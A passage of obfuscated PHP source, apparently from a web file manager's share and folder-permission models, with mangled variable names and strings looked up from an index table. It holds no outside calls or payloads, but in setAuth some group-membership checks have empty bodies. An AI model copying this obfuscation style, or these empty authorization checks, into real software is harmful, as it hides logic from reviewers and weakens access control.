$this->_shareAuthSet($ÂÛ™È›„, $Ö€®Å•Š[$»â‰¸¥Á[2108]]); return $ÂÛ™È›„; } private function shareEventAdd($††­ÙĞº, $å¹«¹Œ, $¬Ø…ÅäÕ = "\x61\144\x64") { $íäêûİõ =& $_SERVER[³à¼î¯á]; if (!$††­ÙĞº || $††­ÙĞº == $íäêûİõ[219]) { return; } if ($¬Ø…ÅäÕ == $íäêûİõ[2109]) { if ($å¹«¹Œ[$íäêûİõ[538]] == $íäêûİõ[91]) { Model($íäêûİõ[608])->eventShare($††­ÙĞº, $íäêûİõ[2110]); } if ($å¹«¹Œ[$íäêûİõ[638]] == $íäêûİõ[91]) { Model($íäêûİõ[608])->eventShare($††­ÙĞº, $íäêûİõ[2111]); } return; } $ú¥ïÀ£ = $this->getInfoByPath($††­ÙĞº); $¯ş­á²¦ = $íäêûİõ[2112]; if ($ú¥ïÀ£[$íäêûİõ[538]] == $íäêûİõ[219] && $å¹«¹Œ[$íäêûİõ[538]] == $íäêûİõ[91]) { $¯ş­á²¦ = $íäêûİõ[2110]; } if ($ú¥ïÀ£[$íäêûİõ[538]] == $íäêûİõ[91] && $å¹«¹Œ[$íäêûİõ[538]] == $íäêûİõ[219]) { $¯ş­á²¦ = $íäêûİõ[2113]; } if ($ú¥ïÀ£[$íäêûİõ[638]] == $íäêûİõ[219] && $å¹«¹Œ[$íäêûİõ[638]] == $íäêûİõ[91]) { $¯ş­á²¦ = $íäêûİõ[2111]; } if ($ú¥ïÀ£[$íäêûİõ[638]] == $íäêûİõ[91] && $å¹«¹Œ[$íäêûİõ[638]] == $íäêûİõ[219]) { $¯ş­á²¦ = $íäêûİõ[2114]; } Model($íäêûİõ[608])->eventShare($††­ÙĞº, $¯ş­á²¦); return; } private function _addShareData($¾¶¼–™, $›“¥›”á = array(), $áÂ÷»Üõ = false) { $‘ªª¯¬‡ =& $_SERVER[³à¼î¯á]; $ğ£Æ¾¦é = $áÂ÷»Üõ == $‘ªª¯¬‡[182] ? 0 : USER_ID; $ş·Â¿úá = array($‘ªª¯¬‡[466] => $¾¶¼–™, $‘ªª¯¬‡[1744] => $ğ£Æ¾¦é); if ($¾¶¼–™ == 0) { $ş·Â¿úá = array($‘ªª¯¬‡[2115] => $›“¥›”á[$‘ªª¯¬‡[1229]], $‘ªª¯¬‡[1744] => $ğ£Æ¾¦é); } if ($ç‹÷ÉĞ° = $this->where($ş·Â¿úá)->find()) { return $ç‹÷ÉĞ°[$‘ªª¯¬‡[640]]; } if ($¾¶¼–™ == 0) { $×²õ¤Ë§ = array($‘ªª¯¬‡[32] => get_path_this($›“¥›”á[$‘ªª¯¬‡[87]])); } else { $×²õ¤Ë§ = Model($‘ªª¯¬‡[869])->sourceInfo($¾¶¼–™); if (!$×²õ¤Ë§) { return !1; } } if (!$›“¥›”á[$‘ªª¯¬‡[1643]]) { $›“¥›”á[$‘ªª¯¬‡[1643]] = $×²õ¤Ë§[$‘ªª¯¬‡[32]]; } $ß¬À•„ = array($‘ªª¯¬‡[1744] => $ğ£Æ¾¦é, $‘ªª¯¬‡[466] => $¾¶¼–™, $‘ªª¯¬‡[1643] => $‘ªª¯¬‡[12], $‘ªª¯¬‡[538] => 0, $‘ªª¯¬‡[638] => 0, $‘ªª¯¬‡[1229] => $‘ªª¯¬‡[12], $‘ªª¯¬‡[358] => $‘ªª¯¬‡[12], $‘ªª¯¬‡[937] => $‘ªª¯¬‡[12], $‘ªª¯¬‡[2116] => 0, $‘ªª¯¬‡[2117] => 0, $‘ªª¯¬‡[806] => 0, $‘ªª¯¬‡[2118] => $‘ªª¯¬‡[12], $‘ªª¯¬‡[2099] => $‘ªª¯¬‡[12]); $‚ÉÓ‚ÊÑ = explode($‘ªª¯¬‡[50], $‘ªª¯¬‡[2119]); foreach ($‚ÉÓ‚ÊÑ as $ïšıº’¤) { if (!isset($›“¥›”á[$ïšıº’¤])) { continue; } $ß¬À•„[$ïšıº’¤] = $›“¥›”á[$ïšıº’¤]; } $à°…¯Ü = $this->add($ß¬À•„); $£©Ùš÷ª = array($‘ªª¯¬‡[2099] => short_id($à°…¯Ü)); $this->where(array($‘ªª¯¬‡[2120] => $à°…¯Ü))->save($£©Ùš÷ª); return $à°…¯Ü; } private function _shareAuthSet($æàßªÑ³, $ğ««úËª) { $øÆ»ã¾ =& $_SERVER[³à¼î¯á]; if (!is_array($ğ««úËª)) { return !1; } $ùÉòì¿› = Model($øÆ»ã¾[2065]); $ùÉòì¿›->where(array($øÆ»ã¾[640] => $æàßªÑ³))->delete(); $€í‘³¼ = array(); foreach ($ğ««úËª as $Åâ…™ì) { $šáµ•˜ = SourceModel::TYPE_USER; if ($Åâ…™ì[$øÆ»ã¾[181]] == SourceModel::TYPE_GROUP) { $šáµ•˜ = SourceModel::TYPE_GROUP; } $‹Şâ­ = array($øÆ»ã¾[640] => $æàßªÑ³, $øÆ»ã¾[181] => $šáµ•˜, $øÆ»ã¾[545] => intval($Åâ…™ì[$øÆ»ã¾[545]]), $øÆ»ã¾[2061] => 0, $øÆ»ã¾[2121] => -1); if ($Åâ…™ì[$øÆ»ã¾[2061]]) { $‹Şâ­[$øÆ»ã¾[2061]] = $Åâ…™ì[$øÆ»ã¾[2061]]; } else { if ($Åâ…™ì[$øÆ»ã¾[2121]]) { $‹Şâ­[$øÆ»ã¾[2121]] = $Åâ…™ì[$øÆ»ã¾[2121]]; } } $€í‘³¼[] = $‹Şâ­; } return $ùÉòì¿›->addAll($€í‘³¼, array(), !0); } public function numViewAdd($ı°ÕÃÙ) { $ò¯‡åÃœ =& $_SERVER[³à¼î¯á]; $ôÂÇ¬é = array($ò¯‡åÃœ[2120] => $ı°ÕÃÙ); $this->where($ôÂÇ¬é)->setAdd($ò¯‡åÃœ[2116]); } public function numDownloadAdd($œô§ö“‘) { $¬¤Š¥¸ =& $_SERVER[³à¼î¯á]; $«ªÃ›¥ª = array($¬¤Š¥¸[2120] => $œô§ö“‘); $this->where($«ªÃ›¥ª)->setAdd($¬¤Š¥¸[2117]); } protected function shareEdit($•¤œ¯ëì, $ÍìÒ±¨Ô) { $Ñ¿ş–˜ñ =& $_SERVER[³à¼î¯á]; $äéÕÓ–  = $this->getInfo($•¤œ¯ëì); if (!$äéÕÓ– ) { return !1; } $this->_checkLinkShare($ÍìÒ±¨Ô, $äéÕÓ– ); $ï¿Î’É° = array(); $ïÚ¡ŒÖÁ = explode($Ñ¿ş–˜ñ[50], $Ñ¿ş–˜ñ[2122]); foreach ($ïÚ¡ŒÖÁ as $ÆËÇŠÈô) { if (!array_key_exists($ÆËÇŠÈô, $ÍìÒ±¨Ô)) { continue; } $ï¿Î’É°[$ÆËÇŠÈô] = $ÍìÒ±¨Ô[$ÆËÇŠÈô]; } $this->shareEventAdd($äéÕÓ– [$Ñ¿ş–˜ñ[184]], $ÍìÒ±¨Ô, $Ñ¿ş–˜ñ[1922]); $this->where(array($Ñ¿ş–˜ñ[2120] => $•¤œ¯ëì))->save($ï¿Î’É°); if (isset($ÍìÒ±¨Ô[$Ñ¿ş–˜ñ[2108]])) { $this->_shareAuthSet($•¤œ¯ëì, $ÍìÒ±¨Ô[$Ñ¿ş–˜ñ[2108]]); } return !0; } private function _checkLinkShare($ú‰ĞÅÌ, $šä² õ) { $İ¤è½ˆ– =& $_SERVER[³à¼î¯á]; if ($ú‰ĞÅÌ[$İ¤è½ˆ–[538]] != $İ¤è½ˆ–[91]) { return; } $İØšªºŸ = $šä² õ[$İ¤è½ˆ–[90]][$İ¤è½ˆ–[184]]; if ($šä² õ[$İ¤è½ˆ–[90]][$İ¤è½ˆ–[33]] != $İ¤è½ˆ–[221]) { $…£¨Ø = $this->_folderReport($İØšªºŸ); if (!$…£¨Ø) { return; } show_json(LNG($İ¤è½ˆ–[2123]) . $İ¤è½ˆ–[2124] . $…£¨Ø, !1); } $êñû øš = Model($İ¤è½ˆ–[869])->fileInfoGet($šä² õ[$İ¤è½ˆ–[90]][$İ¤è½ˆ–[184]]); if (!$êñû øš) { return; } $»…’ô°Ã = $this->shareFileMeta($êñû øš[$İ¤è½ˆ–[516]]); if (isset($»…’ô°Ã[$İ¤è½ˆ–[425]]) && $»…’ô°Ã[$İ¤è½ˆ–[425]] == $İ¤è½ˆ–[91]) { show_json(LNG($İ¤è½ˆ–[2125]), !1); } } private function _folderReport($¢•ºÒ¤) { $ûÑÍ‚å =& $_SERVER[³à¼î¯á]; $¥ëˆÑÖÈ = array($ûÑÍ‚å[516] => array($ûÑÍ‚å[1062], 0), $ûÑÍ‚å[795] => 3); $øâ•¹… = Model($ûÑÍ‚å[2126])->where($¥ëˆÑÖÈ)->field($ûÑÍ‚å[516])->select(); if (!$øâ•¹…) { return !1; } $øâ•¹… = array_to_keyvalue($øâ•¹…, $ûÑÍ‚å[12], $ûÑÍ‚å[516]); $†ÉŸ¤ñ = $ûÑÍ‚å[50] . $¢•ºÒ¤ . $ûÑÍ‚å[50]; $¥ëˆÑÖÈ = array($ûÑÍ‚å[516] => array($ûÑÍ‚å[7], $øâ•¹…), $ûÑÍ‚å[560] => array($ûÑÍ‚å[434], "\x25{$†ÉŸ¤ñ}\x25"), $ûÑÍ‚å[480] => 0); $ÁË¯ÛğŒ = Model($ûÑÍ‚å[869])->where($¥ëˆÑÖÈ)->field($ûÑÍ‚å[2127])->find(); if (!$ÁË¯ÛğŒ) { return !1; } $Æˆ«÷è = substr($ÁË¯ÛğŒ[$ûÑÍ‚å[560]], strpos($ÁË¯ÛğŒ[$ûÑÍ‚å[560]], $†ÉŸ¤ñ)); $¥ëˆÑÖÈ = array($ûÑÍ‚å[184] => array($ûÑÍ‚å[7], trim($Æˆ«÷è, $ûÑÍ‚å[50]))); $‚º‹Û‹Û = Model($ûÑÍ‚å[869])->where($¥ëˆÑÖÈ)->field($ûÑÍ‚å[32])->select(); $ˆË®¨œ™ = array_to_keyvalue($‚º‹Û‹Û, $ûÑÍ‚å[12], $ûÑÍ‚å[32]); $ˆË®¨œ™[] = $ÁË¯ÛğŒ[$ûÑÍ‚å[32]]; return implode($ûÑÍ‚å[8], $ˆË®¨œ™); } protected function remove($ˆìÔïø¢) { $Ä–‰©Äğ =& $_SERVER[³à¼î¯á]; if (is_array($ˆìÔïø¢)) { $ˆìÔïø¢ = array($Ä–‰©Äğ[7], $ˆìÔïø¢); } $¾Ääàâ‡ = array($Ä–‰©Äğ[640] => $ˆìÔïø¢); $¥Å¤áÜ’ = $this->where($¾Ääàâ‡)->delete(); if ($¥Å¤áÜ’) { Model($Ä–‰©Äğ[641])->where(array($Ä–‰©Äğ[640] => $ˆìÔïø¢))->delete(); } $ı÷¸ªÔö = is_array($ˆìÔïø¢) ? $ˆìÔïø¢[1] : array($ˆìÔïø¢); for ($©ğ¥¥ø = 0; $©ğ¥¥ø < count($ı÷¸ªÔö); $©ğ¥¥ø++) { $³ÈíÃ•Ì = $this->getInfo($ı÷¸ªÔö[$©ğ¥¥ø]); if ($³ÈíÃ•Ì[$Ä–‰©Äğ[638]] == $Ä–‰©Äğ[91]) { Model($Ä–‰©Äğ[608])->eventShare($³ÈíÃ•Ì[$Ä–‰©Äğ[184]], $Ä–‰©Äğ[2114]); } if ($³ÈíÃ•Ì[$Ä–‰©Äğ[538]] == $Ä–‰©Äğ[91]) { Model($Ä–‰©Äğ[608])->eventShare($³ÈíÃ•Ì[$Ä–‰©Äğ[184]], $Ä–‰©Äğ[2113]); } } return $¥Å¤áÜ’; } protected function removeBySource($ã¬ÊáîË) { $–²‡Ë– =& $_SERVER[³à¼î¯á]; $Â„ÉÌ–¡ = array($–²‡Ë–[466] => array($–²‡Ë–[467], $ã¬ÊáîË)); $Ë–ŸØÅê = $this->field($–²‡Ë–[640])->where($Â„ÉÌ–¡)->select(); $Ë–ŸØÅê = array_to_keyvalue($Ë–ŸØÅê, $–²‡Ë–[12], $–²‡Ë–[640]); if (!$Ë–ŸØÅê) { return; } $Â„ÉÌ–¡ = array($–²‡Ë–[2120] => array($–²‡Ë–[467], $Ë–ŸØÅê)); $this->where($Â„ÉÌ–¡)->delete(); Model($–²‡Ë–[641])->where($Â„ÉÌ–¡)->delete(); } public function listAll($‘ìóêÒƒ) { $ªáş¤ë÷ =& $_SERVER[³à¼î¯á]; $€Áë© = array(); if ($‘ìóêÒƒ[$ªáş¤ë÷[1753]]) { $€Áë©[$ªáş¤ë÷[1753]] = $‘ìóêÒƒ[$ªáş¤ë÷[1753]]; } if ($‘ìóêÒƒ[$ªáş¤ë÷[805]]) { $õ°©åäÆ = $‘ìóêÒƒ[$ªáş¤ë÷[806]] ? $‘ìóêÒƒ[$ªáş¤ë÷[806]] : strtotime(date($ªáş¤ë÷[2128])); $€Áë©[$ªáş¤ë÷[222]] = array($ªáş¤ë÷[384], array($‘ìóêÒƒ[$ªáş¤ë÷[805]], $õ°©åäÆ)); } if ($‘ìóêÒƒ[$ªáş¤ë÷[33]]) { $€Áë©[$‘ìóêÒƒ[$ªáş¤ë÷[33]]] = 1; } else { $€Áë©[] = array($ªáş¤ë÷[538] => array($ªáş¤ë÷[1062], 0), $ªáş¤ë÷[638] => array($ªáş¤ë÷[1062], 0), $ªáş¤ë÷[2102] => $ªáş¤ë÷[2055]); } if ($‘ìóêÒƒ[$ªáş¤ë÷[2051]]) { $€Áë©[] = array($ªáş¤ë÷[2099] => $‘ìóêÒƒ[$ªáş¤ë÷[2051]], $ªáş¤ë÷[1643] => array($ªáş¤ë÷[434], "\45{$‘ìóêÒƒ[$ªáş¤ë÷[2051]]}\x25"), $ªáş¤ë÷[2102] => $ªáş¤ë÷[2055]); } $ÍÜ’¡”Á = $this->_makeOrder()->where($€Áë©)->selectPage(20); if (empty($ÍÜ’¡”Á[$ªáş¤ë÷[420]])) { return array(); } $this->_listDataApply($ÍÜ’¡”Á[$ªáş¤ë÷[420]]); return $ÍÜ’¡”Á; } public function listDataApply($‚³Õ¶Ò) { $this->_listDataApply($‚³Õ¶Ò); return $‚³Õ¶Ò; } private function _listDataApply(&$Ä”ÕÄ) { $Öã‘Áşç =& $_SERVER[³à¼î¯á]; $¾ŒŞ‚È = array_to_keyvalue($Ä”ÕÄ, $Öã‘Áşç[12], $Öã‘Áşç[1753]); $ÑƒÍ½¯Ï = Model($Öã‘Áşç[574])->userListInfo(array_unique($¾ŒŞ‚È)); $‹ûßä…Š = array_to_keyvalue($Ä”ÕÄ, $Öã‘Áşç[12], $Öã‘Áşç[184]); $ˆÖ²ûŒ = Model($Öã‘Áşç[869])->sourceListInfo($‹ûßä…Š, !0); foreach ($Ä”ÕÄ as $¼ğ­‘÷ş => &$¶İÃ²ï™) { $§öìó¾ş = $¶İÃ²ï™[$Öã‘Áşç[1753]]; $¶İÃ²ï™[$Öã‘Áşç[2129]] = $ÑƒÍ½¯Ï[$§öìó¾ş] ? $ÑƒÍ½¯Ï[$§öìó¾ş] : !1; $™–ƒÎÉ = $¶İÃ²ï™[$Öã‘Áşç[184]]; $¶İÃ²ï™[$Öã‘Áşç[90]] = $ˆÖ²ûŒ[$™–ƒÎÉ] ? $ˆÖ²ûŒ[$™–ƒÎÉ] : !1; if ($¶İÃ²ï™[$Öã‘Áşç[90]][$Öã‘Áşç[480]] == $Öã‘Áşç[91]) { unset($Ä”ÕÄ[$¼ğ­‘÷ş]); } if ($¶İÃ²ï™[$Öã‘Áşç[90]] != $Öã‘Áşç[219] && !$¶İÃ²ï™[$Öã‘Áşç[90]]) { unset($Ä”ÕÄ[$¼ğ­‘÷ş]); } } unset($¶İÃ²ï™); $Ä”ÕÄ = array_values($Ä”ÕÄ); } private function _makeOrder($¾ÀŸ¥–÷ = '') { $Ø–ŠÚÀñ =& $_SERVER[³à¼î¯á]; $‡¼©³¯Ã = array($Ø–ŠÚÀñ[222], $Ø–ŠÚÀñ[806], $Ø–ŠÚÀñ[2116], $Ø–ŠÚÀñ[2117]); $ö€““ˆ½ = array($Ø–ŠÚÀñ[498] => $Ø–ŠÚÀñ[499], $Ø–ŠÚÀñ[500] => $Ø–ŠÚÀñ[501]); $•Ü“áÏê = Input::get($Ø–ŠÚÀñ[505], $Ø–ŠÚÀñ[7], $Ø–ŠÚÀñ[472], $‡¼©³¯Ã); $óÑãïùí = Input::get($Ø–ŠÚÀñ[506], $Ø–ŠÚÀñ[7], $Ø–ŠÚÀñ[2130], array($Ø–ŠÚÀñ[2048], $Ø–ŠÚÀñ[500])); $óÑãïùí = $ö€““ˆ½[$óÑãïùí]; $¾ÀŸ¥–÷ = $¾ÀŸ¥–÷ . "{$•Ü“áÏê}\40{$óÑãïùí}"; return $this->order($¾ÀŸ¥–÷); } public function reportAdd($É²âóØæ) { $ñ»ßÃ‘ß =& $_SERVER[³à¼î¯á]; $…àÈ¹ç = array($ñ»ßÃ‘ß[640] => $É²âóØæ[$ñ»ßÃ‘ß[640]], $ñ»ßÃ‘ß[1753] => USER_ID); if (Model($ñ»ßÃ‘ß[2126])->where($…àÈ¹ç)->find()) { return !1; } $¼É”œŞÚ = array($ñ»ßÃ‘ß[640] => $É²âóØæ[$ñ»ßÃ‘ß[640]], $ñ»ßÃ‘ß[1643] => $É²âóØæ[$ñ»ßÃ‘ß[1643]], $ñ»ßÃ‘ß[184] => $É²âóØæ[$ñ»ßÃ‘ß[184]], $ñ»ßÃ‘ß[516] => $É²âóØæ[$ñ»ßÃ‘ß[516]], $ñ»ßÃ‘ß[1753] => USER_ID, $ñ»ßÃ‘ß[33] => $É²âóØæ[$ñ»ßÃ‘ß[33]], $ñ»ßÃ‘ß[501] => $É²âóØæ[$ñ»ßÃ‘ß[501]]); return Model($ñ»ßÃ‘ß[2126])->add($¼É”œŞÚ); } public function reportList($¼”îüª™) { $³ì¶—¢‚ =& $_SERVER[³à¼î¯á]; $™¡Ñ€Ñ = array(); if ($¼”îüª™[$³ì¶—¢‚[805]]) { $ÂåôŸ³İ = $¼”îüª™[$³ì¶—¢‚[806]] ? $¼”îüª™[$³ì¶—¢‚[806]] : strtotime(date($³ì¶—¢‚[2128])); $™¡Ñ€Ñ[$³ì¶—¢‚[222]] = array($³ì¶—¢‚[384], array($¼”îüª™[$³ì¶—¢‚[805]], $ÂåôŸ³İ)); } if (isset($¼”îüª™[$³ì¶—¢‚[33]]) && in_array($¼”îüª™[$³ì¶—¢‚[33]], array($³ì¶—¢‚[91], $³ì¶—¢‚[485], $³ì¶—¢‚[2131], $³ì¶—¢‚[2132], $³ì¶—¢‚[2133]))) { $™¡Ñ€Ñ[$³ì¶—¢‚[33]] = $¼”îüª™[$³ì¶—¢‚[33]]; } if (isset($¼”îüª™[$³ì¶—¢‚[795]]) && in_array($¼”îüª™[$³ì¶—¢‚[795]], array($³ì¶—¢‚[219], $³ì¶—¢‚[91], $³ì¶—¢‚[485], $³ì¶—¢‚[2131]))) { $™¡Ñ€Ñ[$³ì¶—¢‚[795]] = $¼”îüª™[$³ì¶—¢‚[795]]; } $¬ØÃ•¶ı = Input::get($³ì¶—¢‚[506], $³ì¶—¢‚[7], $³ì¶—¢‚[2130], array($³ì¶—¢‚[2048], $³ì¶—¢‚[500])); $’²è¾ˆÛ = array($³ì¶—¢‚[498] => $³ì¶—¢‚[499], $³ì¶—¢‚[500] => $³ì¶—¢‚[501]); $¬›éÄô = $³ì¶—¢‚[2134] . $’²è¾ˆÛ[$¬ØÃ•¶ı]; $ÌŒ‘äá = Model($³ì¶—¢‚[2126])->where($™¡Ñ€Ñ)->order($¬›éÄô)->selectPage(20); if (empty($ÌŒ‘äá[$³ì¶—¢‚[420]])) { return array(); } $ü„¶‡ƒË = array_to_keyvalue_group($ÌŒ‘äá[$³ì¶—¢‚[420]], $³ì¶—¢‚[795], $³ì¶—¢‚[640]); if (!empty($ü„¶‡ƒË[0])) { $¼”îüª™ = $ü„¶‡ƒË[0]; $™¡Ñ€Ñ = array($³ì¶—¢‚[640] => array($³ì¶—¢‚[7], $¼”îüª™)); $‡ôüÎÆ¹ = $this->where($™¡Ñ€Ñ)->field($³ì¶—¢‚[640])->select(); $‡ôüÎÆ¹ = array_to_keyvalue($‡ôüÎÆ¹, $³ì¶—¢‚[12], $³ì¶—¢‚[640]); $ö¾Ò°¸Œ = array_diff($¼”îüª™, $‡ôüÎÆ¹); if (!empty($ö¾Ò°¸Œ)) { foreach ($ÌŒ‘äá[$³ì¶—¢‚[420]] as $Îşã¹Ş => $ÜŞª‰Ğ¿) { if (in_array($ÜŞª‰Ğ¿[$³ì¶—¢‚[640]], $ö¾Ò°¸Œ)) { unset($ÌŒ‘äá[$³ì¶—¢‚[420]][$Îşã¹Ş]); } } } } $this->_listDataApply($ÌŒ‘äá[$³ì¶—¢‚[420]]); return $ÌŒ‘äá; } public function reportStatus($²êóÜš) { $¶ŒĞÖí =& $_SERVER[³à¼î¯á]; $ÛÌ¼¦Ø = array($¶ŒĞÖí[450] => $²êóÜš[$¶ŒĞÖí[450]]); $ğÎÛŸ”Ô = Model($¶ŒĞÖí[2126])->where($ÛÌ¼¦Ø)->field($¶ŒĞÖí[2135])->find(); if (!$ğÎÛŸ”Ô) { return !1; } $Øûå•¿ö = array($¶ŒĞÖí[795] => $²êóÜš[$¶ŒĞÖí[795]]); if ($²êóÜš[$¶ŒĞÖí[795]] == $¶ŒĞÖí[2131] && $ğÎÛŸ”Ô[$¶ŒĞÖí[795]] == $¶ŒĞÖí[2131]) { $Øûå•¿ö[$¶ŒĞÖí[795]] = 0; } $×Í‘¬™„ = Model($¶ŒĞÖí[2126])->where($ÛÌ¼¦Ø)->save($Øûå•¿ö); if ($²êóÜš[$¶ŒĞÖí[795]] == $¶ŒĞÖí[485]) { if ($ğÎÛŸ”Ô[$¶ŒĞÖí[516]] != $¶ŒĞÖí[219] && $this->shareFileMeta($ğÎÛŸ”Ô[$¶ŒĞÖí[516]])) { $this->shareFileMeta($ğÎÛŸ”Ô[$¶ŒĞÖí[516]], 0); } $this->remove($ğÎÛŸ”Ô[$¶ŒĞÖí[640]]); return !0; } if ($×Í‘¬™„ && $²êóÜš[$¶ŒĞÖí[795]] == $¶ŒĞÖí[2131]) { $èà§ ñ« = $Øûå•¿ö[$¶ŒĞÖí[795]] == $¶ŒĞÖí[2131] ? 1 : 0; $this->shareFileMeta($ğÎÛŸ”Ô[$¶ŒĞÖí[516]], $èà§ ñ«); $this->removeByFile($ğÎÛŸ”Ô[$¶ŒĞÖí[516]]); } return $×Í‘¬™„; } private function removeByFile($¢ºÊàĞ¡) { $³öé¥ ‚ =& $_SERVER[³à¼î¯á]; $Î¶ª•ÈÕ = Model($³öé¥ ‚[869])->where(array($³öé¥ ‚[516] => $¢ºÊàĞ¡))->field($³öé¥ ‚[184])->select(); $—ŞÏàÖÂ = array_to_keyvalue($Î¶ª•ÈÕ, $³öé¥ ‚[12], $³öé¥ ‚[184]); $ÓÕÈ©áü = array($³öé¥ ‚[184] => array($³öé¥ ‚[7], $—ŞÏàÖÂ), $³öé¥ ‚[538] => 1); $Î¶ª•ÈÕ = $this->where($ÓÕÈ©áü)->field($³öé¥ ‚[640])->select(); if (empty($Î¶ª•ÈÕ)) { return; } $àÒ±€ß™ = array_to_keyvalue($Î¶ª•ÈÕ, $³öé¥ ‚[12], $³öé¥ ‚[640]); $this->remove($àÒ±€ß™); } private function shareFileMeta($²‹óŠûä, $çÑÛ ïõ = null) { $®ÜµÙÕ =& $_SERVER[³à¼î¯á]; $ò¦¼Í»¤ = array($®ÜµÙÕ[516] => $²‹óŠûä, $®ÜµÙÕ[97] => $®ÜµÙÕ[2136]); if (is_null($çÑÛ ïõ)) { return Model($®ÜµÙÕ[2137])->where($ò¦¼Í»¤)->find(); } $ò¦¼Í»¤[$®ÜµÙÕ[425]] = $çÑÛ ïõ; Model($®ÜµÙÕ[2137])->add($ò¦¼Í»¤, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\x75\x72\x63\145\x5f\141\x75\x74\150"; public function getAuth($´™úªßŠ) { $·•îº¯­ =& $_SERVER[³à¼î¯á]; $Âã·¼ = $this->sourceAuthSelect($´™úªßŠ); $¹Ø†¯Œ = array(); $Ø°ˆà¡Ş = array(); $èÒ‰ŠùÉ = 2 << 25; foreach ($Âã·¼ as $îòË¹â) { $°óŞ€ŒÌ = Model($·•îº¯­[547])->listData($îòË¹â[$·•îº¯­[2061]]); if (!$°óŞ€ŒÌ) { continue; } $¹Ø†¯Œ[] = $îòË¹â; $«µßÎüÃ = 0; if ($îòË¹â[$·•îº¯­[181]] == SourceModel::TYPE_GROUP) { $«µßÎüÃ = $èÒ‰ŠùÉ * 2; } if ($îòË¹â[$·•îº¯­[181]] == SourceModel::TYPE_USER) { $«µßÎüÃ = $èÒ‰ŠùÉ; } if ($îòË¹â[$·•îº¯­[181]] == SourceModel::TYPE_USER && $îòË¹â[$·•îº¯­[545]] == $·•îº¯­[219]) { $«µßÎüÃ = 0; } $Ø°ˆà¡Ş[] = $°óŞ€ŒÌ[$·•îº¯­[462]] + $«µßÎüÃ; } array_multisort($Ø°ˆà¡Ş, SORT_DESC, $¹Ø†¯Œ); return $¹Ø†¯Œ; } public function sourceAuthSelect($ÇÓ©¡ä) { $½Éè‚¤ë =& $_SERVER[³à¼î¯á]; static $¡Ş»²à× = array(); $ªâú½©ˆ = is_array($ÇÓ©¡ä) ? !1 : !0; if ($ªâú½©ˆ) { $ÇÓ©¡ä = array($ÇÓ©¡ä); } $óƒ¥æ‰“ = array(); foreach ($ÇÓ©¡ä as $ù¶ß¶ˆï) { if (isset($¡Ş»²à×[$ù¶ß¶ˆï])) { $óƒ¥æ‰“[$ù¶ß¶ˆï] = $¡Ş»²à×[$ù¶ß¶ˆï]; } } if (count($óƒ¥æ‰“) == count($ÇÓ©¡ä)) { return $ªâú½©ˆ ? $óƒ¥æ‰“[$ÇÓ©¡ä[0]] : $óƒ¥æ‰“; } $î½¸Ø­Œ = $½Éè‚¤ë[2138]; $¯ºóñÖÏ = array($½Éè‚¤ë[184] => array($½Éè‚¤ë[7], $ÇÓ©¡ä)); $¢…ÑÓ§„ = $this->field($î½¸Ø­Œ)->order($½Éè‚¤ë[450])->where($¯ºóñÖÏ)->select(); $Äšá·Ëº = array_to_keyvalue_group($¢…ÑÓ§„, $½Éè‚¤ë[184]); foreach ($ÇÓ©¡ä as $ù¶ß¶ˆï) { $¡Ş»²à×[$ù¶ß¶ˆï] = $Äšá·Ëº[$ù¶ß¶ˆï] ? $Äšá·Ëº[$ù¶ß¶ˆï] : array(); } if ($ªâú½©ˆ) { return $¢…ÑÓ§„; } return $Äšá·Ëº; } public function setAuth($Ê·“€ƒï, $±ŒàÎ…°) { $½Şƒ¦«µ =& $_SERVER[³à¼î¯á]; $ë™ÛûùÃ = Model($½Şƒ¦«µ[1388])->sourceInfo($Ê·“€ƒï); if (!$ë™ÛûùÃ) { return !1; } if ($ë™ÛûùÃ[$½Şƒ¦«µ[181]] != SourceModel::TYPE_GROUP) { return !1; } $¿ÌòÚ¯ = 1; $’¹›İ = $ë™ÛûùÃ[$½Şƒ¦«µ[545]]; if ($’¹›İ != $¿ÌòÚ¯) { $É¿Ş Ğ = array($½Şƒ¦«µ[1952] => $’¹›İ); $Şòéˆé“ = Model($½Şƒ¦«µ[2047])->field($½Şƒ¦«µ[1753])->where($É¿Ş Ğ)->select(); $Şòéˆé“ = array_to_keyvalue($Şòéˆé“, $½Şƒ¦«µ[12], $½Şƒ¦«µ[1753]); } $Ú€ÛÛÑ¼ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $á¥‹·•Ä = array(); foreach ($±ŒàÎ…° as $Îô¸Èá®) { if (!in_array($Îô¸Èá®[$½Şƒ¦«µ[181]], $Ú€ÛÛÑ¼)) { show_json(LNG($½Şƒ¦«µ[2139]), !1); } if ($’¹›İ != $¿ÌòÚ¯) { if ($Îô¸Èá®[$½Şƒ¦«µ[181]] == SourceModel::TYPE_GROUP) { } if ($Îô¸Èá®[$½Şƒ¦«µ[545]] != 0 && !in_array($Îô¸Èá®[$½Şƒ¦«µ[545]], $Şòéˆé“)) { } } if ($Îô¸Èá®[$½Şƒ¦«µ[545]] == 0) { $Îô¸Èá®[$½Şƒ¦«µ[181]] = SourceModel::TYPE_USER; } $á¥‹·•Ä[] = array($½Şƒ¦«µ[184] => $Ê·“€ƒï, $½Şƒ¦«µ[181] => intval($Îô¸Èá®[$½Şƒ¦«µ[181]]), $½Şƒ¦«µ[545] => intval($Îô¸Èá®[$½Şƒ¦«µ[545]]), $½Şƒ¦«µ[2061] => intval($Îô¸Èá®[$½Şƒ¦«µ[2061]]) ? intval($Îô¸Èá®[$½Şƒ¦«µ[2061]]) : 0, $½Şƒ¦«µ[2121] => intval($Îô¸Èá®[$½Şƒ¦«µ[2121]]) ? intval($Îô¸Èá®[$½Şƒ¦«µ[2121]]) : -1); } $this->where(array($½Şƒ¦«µ[466] => $Ê·“€ƒï))->delete(); $this->addAll($á¥‹·•Ä); return !0; } public function authClear($·ıîÆù•) { $ò¶›º =& $_SERVER[³à¼î¯á]; $ú›øÔï = Model($ò¶›º[1388])->sourceInfo($·ıîÆù•); $ËæÑÉà­ = array($·ıîÆù•); if ($ú›øÔï[$ò¶›º[460]] == $ò¶›º[91]) { $«èï¤â¼ = array($ò¶›º[627] => array($ò¶›º[587], $ú›øÔï[$ò¶›º[560]] . $·ıîÆù• . $ò¶›º[588])); $ËæÑÉà­ = Model($ò¶›º[1388])->field($ò¶›º[466])->where($«èï¤â¼)->getField($ò¶›º[184], !0); $ËæÑÉà­[] = $·ıîÆù•; } $this->where(array($ò¶›º[466] => array($ò¶›º[467], $ËæÑÉà­)))->delete(); return !0; } public function getAllChildren($Õ¿‰±ëÖ) { $ò©–ÁŠ =& $_SERVER[³à¼î¯á]; $Âëú‹à 